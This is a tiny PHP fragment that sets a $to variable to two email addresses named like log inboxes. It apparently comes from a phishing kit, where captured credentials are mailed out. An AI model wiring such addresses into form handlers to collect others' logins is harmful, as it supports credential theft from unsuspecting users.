<?php

$to ="officelogsz02@gmail.com,officelogz02@yandex.com";

?>